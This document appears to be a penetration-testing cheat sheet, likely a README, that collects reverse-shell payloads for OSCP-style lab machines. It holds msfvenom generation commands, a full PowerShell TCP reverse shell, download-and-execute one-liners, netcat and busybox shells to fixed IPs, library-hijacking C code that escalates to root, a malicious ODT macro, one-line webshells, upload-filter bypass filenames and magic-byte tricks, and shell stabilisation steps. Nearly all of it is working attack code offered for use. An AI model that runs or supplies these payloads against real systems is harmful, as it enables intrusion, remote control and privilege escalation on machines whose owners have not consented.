# Shells

## Table of contents

##### ➤ Shells

* [Reverse shell](#reverse-shell)
* [One liner](#one-liner)
* [Webshell](#webshell)
* [Online generator](#online-generator)

##### ➤ Upload bypass

* [Rename the extension](#rename-the-extension)
* [Bypass the extension checks](#bypass-the-entension-checks)
* [Bypass using the content-type](#bypass-using-the-content-type)
* [Magic number](#magic-number)
* [Bypass using .htaccess](#bypass-using-htaccess)


##### ➤ Shell Stabilisation

* [Technique 01: Python](#technique-01-python)
* [Technique 02: Script](#technique-02-script)
* [Technique 03: Rlwrap](#technique-03-rlwrap)
* [Technique 04: Socat](#technique-04-socat)



# 
# ⭕ Shells

## 🔻Reverse shell

#### ➤ .ELF (Linux)
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### .SH
```
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > reverse.sh
```

#### ➤ .EXE
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### ➤ .PS1 (Powershell - Basic)
```
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.194',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### ➤ .PS1 (Powershell - Upload and execution)
```
# This reverse shell download a reverse shell name Invoke-PowerShellTcp.ps1 and execute it to obtain a reverse shell
# Reverse shell : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
# Raw direct link : https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

powershell iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1:4444/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 443
```

#### ➤ .ASP
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

#### ➤ .ASPX
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
```

#### ➤ .JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

#### ➤ .WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

#### ➤ .PHP
```
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

#### ➤ .HTA
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell.hta
```

#### ➤ .DLL
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
```

#### ➤ .RB (Ruby)
```
msfvenom --platform ruby -p ruby/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -o payload.rb
```

#### ➤ .JAR

Using msfvenom
```
msfvenom -p java/shell_reverse_tcp LHOST=192.168.5.128 LPORT=1234  -f jar > rev.jar
```

Manually
```
Step 1. Create a shell.java code

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class shell {
	public static void main(String[] args) {
		String command = "busybox nc 192.168.49.57 443 -e /bin/bash";
		try {
			//Execute the command
			Process process = Runtime.getRuntime().exec(command);

			//Read output (similar to ProcessBuilder example)
			BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			String line;
			StringBuilder output = new StringBuilder();
			while ((line = reader.readLine()) != null) {
				output.append(line).append("\n");
			}

			int exitCode = process.waitFor();
			System.out.println("Command executed with exit code: " + exitCode);
			System.out.println("Output:\n" + output.toString());

		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}

Step 2. Compilation

javac -d ./build *.java
cd build
java cvf shell.jar *
```


#### ➤ .SO

reference : 

https://routezero.security/2025/02/19/proving-grounds-practice-dev_working-walkthrough/

https://medium.com/@carlosbudiman/oscp-proving-grounds-dev-working-intermediate-linux-cd59f01b42c9

Code example 01 (lib_backup.c): LPE
```
Code :
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void advance_backup_custom_implementation() {
    setuid(0); // Elevate privileges to root
    system("/bin/bash");
    printf("Backup completed by the dynamic library.\n");
}

Exploitation :
gcc -shared -fPIC -o lib_backup.so lib_backup.c
```

Code example 02 (lib_backup.c): Reverse shell
```
Code :
#include <stdio.h>  
#include <stdlib.h>  
#include <sys/types.h>  
#include <unistd.h>  
  
static void advance_backup_custom_implementation() __attribute__((constructor));  
  
void advance_backup_custom_implementation() {  
 setuid(0);  
 setgid(0);  
 printf("Reverse Shell via library hijacking... \n");  
 const char *ncshell = "busybox nc 192.168.45.197 80 -e /bin/bash";  
 system(ncshell);  
}

Exploitation :
gcc -shared -fPIC -o lib_backup.so lib_backup.c
```

Code example 03 (lib_backup.c): Create SUID on bash
```
Code :
#include <stdio.h>  
#include <stdlib.h>  
#include <sys/types.h>  
#include <unistd.h>  
  
static void advance_backup_custom_implementation() __attribute__((constructor));  
  
void advance_backup_custom_implementation() {  
 setuid(0);  
 setgid(0);  
 printf("Reverse Shell via library hijacking... \n");  
 system("chmod 4777 /bin/bash");  
}

Exploitation :
gcc -Wall -fPIC -c lib_backup.c -o lib_backup.o
gcc -shared lib_backup.o -o lib_backup.so

Once SUID activated, only perform :
/bin/bash -p
```

#### ➤ Macro .ODT

How to create a malicious .ODT macro : 

https://www.savagehack.com/blog/craft-walkthrough-proving-grounds-offsec

https://medium.com/@ardian.danny/oscp-practice-series-59-proving-grounds-craft-4b86a013924d


```
Sub Main

    REM Windows POC

    REM POC 01 : This macro download powercat then execute a reverse sheLl. To use it, simply remove the REM flag at the beginning of the next line
    REM Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://<ATTACKER-IP>/powercat.ps1');powercat -c <ATTACKER-IP> -p <ATTACKER-PORT> -e powershell")

    REM POC 02 : This macro download in memory a reverse shell and execute it
    REM Shell("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER-IP>:<ATTACKER-PORT>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER-LISTENER-IP> -Port <ATTACKER-LISTENER-PORT>")

    REM POC 03 : Upload a reverse shell.exe into C:\Windows\Temp folder then execute it.
    REM Shell("cmd /c certutil.exe -urlcache -split -f 'http://<ATTACKER-IP/shell.exe' 'C:\Windows\Temp\shell.exe'")
	REM Shell("cmd /c 'C:\Windows\Temp\shell.exe'")

    REM Linux POC

    REM POC 01 : This macro execute a bash reverse shell
    REM Shell("bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1'")

End Sub
```

#### ➤ RUNAS (Windows)
```
#Execute a specific command :
runas /user:administrator "cmd.exe /c whoami > whoami.txt"

#Execute a reverseshell :
runas /user:administrator "nc.exe -e cmd 192.168.45.243 445"
```

#### ➤ Invoke-RunasCs (powershell)

Script : https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1

```
PS C:\xampp\htdocs\uploads> Import-module Invoke-RunasCs.ps1

Test user : 
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"

Reverse shell :
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.49.55:443
```


#### ➤ Busybox

Busybox may be installed on the victim linux machine and it is deployed directly with netcat.

```
busybox nc 192.168.0.10 80 -e bash
```

#### ➤ NC

netcat linux binaries : https://github.com/H74N/netcat-binaries/tree/master/build

```
nc 192.168.0.1 443 -e /bin/sh
nc -c /bin/sh 192.168.0.1 443
```

Famous error :
```
Segmentation fault (core dumped)

In this case, use the nc32 version rather than nc64 version
```

## 🔻Single line Webshell

#### ➤ PHP
```
<?php echo passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```

#### ➤ ASP
```
<% eval request("cmd") %>
```

#### ➤ JSP
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

#### ➤ Python

```
Example 01 :

import os
os.system("busybox nc 192.168.45.154 3306 -e bash")
```

## 🔻Online Generator
https://www.revshells.com/

https://weibell.github.io/reverse-shell-generator/

# 
# ⭕ Upload Bypass

## 🔻Rename the extension 
```
• PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .php16, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

• PHP8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp

• ASP: asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml

• PERL: .pl, .pm, .cgi, .lib

• JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action

• Coldfusion: .cfm, .cfml, .cfc, .dbm

• Flash: .swf

• Erlang Yaws Web Server: .yaws
```

## 🔻Bypass the extension checks

#### ➤ Using some uppercase letters
```
pHp, .pHP5, .aSPx, .jSp ...
```

#### ➤ Adding a valid extension before

• As example, if the png are the only authorized extension:
```
reverseshell.png.php
```

• It is also possible to use the the uppercase letters
```
reverseshell.png.Php5
reverseshell.png.pHTml
``` 

#### ➤ Add special characters at the end

• Some examples
```
reverseshell.php%20
reverseshell.php%0a
reverseshell.php%00
reverseshell.php%0d%0a
reverseshell.php/
reverseshell.php.\
reverseshell.
reverseshell.php....
```

• It is also possible to combine with the previous bypass
```
reverseshell.php5%0a
reverseshell.pHP5%0a
```

#### ➤ Add a double extension and a junk data between them

• Some examples
```
reverseshell.php#.png
reverseshell.php%00.png
reverseshell.php\x00.png
reverseshell.php%0a.png
reverseshell.php%0d%0a.png
reverseshell.phpJunk123png
```

• It is also possible to combine with the uppercase
```
reverseshell.png%00pHp5
```

#### ➤ Add another layer of extensions

• Some examples
```
file.png.jpg.php
```

• It is also possible to combine with the uppercase
```
file.php%00.png%00.jpg
file.pHp%00.pNg%00.jPg
```

## 🔻Bypass using the content-type

Example of content-type :
- image/jpeg
- application/pdf

#### ➤ 1. Initial request (upload of php reverse shell)

![image](https://github.com/Kiosec/Shells/assets/100965892/609150ce-69ac-4769-99cf-155e9d78eeae)


#### ➤ 2. Burp interception and modification 

![image](https://github.com/Kiosec/Shells/assets/100965892/27a84575-0816-419b-86da-3d2972badfb5)


## 🔻Magic number

An image is identified by its first bytes. It is possible to hide a webshell by including a valid img header at the beginning of the webshell file.

#### ➤ GIF
```
Basically you just add the text "GIF89a;" before you shell-code. As exemple :

GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
```

#### ➤ JPEG
```
printf "\xff\xd8\xff\xe0<?php system('id'); ?>" > image?jpg
```

#### ➤ Inject PHP code into into information/comment of the image
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.jpg
```

## 🔻Bypass using .htaccess

```
➤ 1. Create a new .htaccess file
echo "AddType application/x-httpd-php .dork" > .htaccess

➤ 2. Upload the .htaccess file in the victim web folder

➤ 3. Upload your php webshell or reverse shell with .dork rather than .php
ex: php-backdoor.dork
```

# 
# ⭕ Shell Stabilisation

## 🔻Technique 01: Python
```
➤ Step 01 : uses Python to spawn a better featured bash shell
python -c 'import pty;pty.spawn("/bin/bash")'

➤ Step 02: this will give us access to term commands such as clear
export TERM=xterm

➤ Step 03: background the shell using Ctrl + Z
CRTL+Z

➤ Step 04: Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
stty raw -echo; fg

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

➤ Example: 
kiosec@lab:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.0.0.1] from (unknown) [10.1.1.1] 43298

python3 -c 'import pty;pty.spawn("/bin/bash")'
user@box:~$ export TERM=xterm
export TERM=xterm
user@box:~$ ^Z
[1]+ Stopped            sudo nc -lvnp 443
kiosec@lab:~$ stty rauw -echo; fg
nc -lvnp 443

user@box:~$ whoami
user
user@box:~$ ^C
user@box:~$
```

## 🔻Technique 02: Script
```
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
kiosec@mycyberlab:/home/kiosec$
```

## 🔻Technique 03: Rlwrap
rlwrap gives a more fully featured shell including access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
This technique is particularly useful with the Windows shell.

```
➤ Step 01: Install rlwrap (not installed by default on the kali)
apt install rlwrap

➤ Step 02: Invoke the listener.
rlwrap nc -lnvp <port> 

[additional steps for Linux target]
➤ Step 03: background the shell using Ctrl + Z
CRTL+Z

➤ Step 04: Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
stty raw -echo; fg
```

## 🔻Technique 04: Socat
Restricted to Linux target

```
➤ Prerequisite: Obtain Socat on the linux target.

➤ Step 01: Transfer a socat static compiled binary (e.g., using python http.server)
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true

➤ Step 02: On the Kali
socat TCP-L:<port> FILE:`tty`,raw,echo=0

➤ Step 03: execute the reverse shell on the target.

➤ Step 04: Once connected to the target, execute the sepcial socal command in order to 
socat TCP:<kali-attacker-ip>:<kali-attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
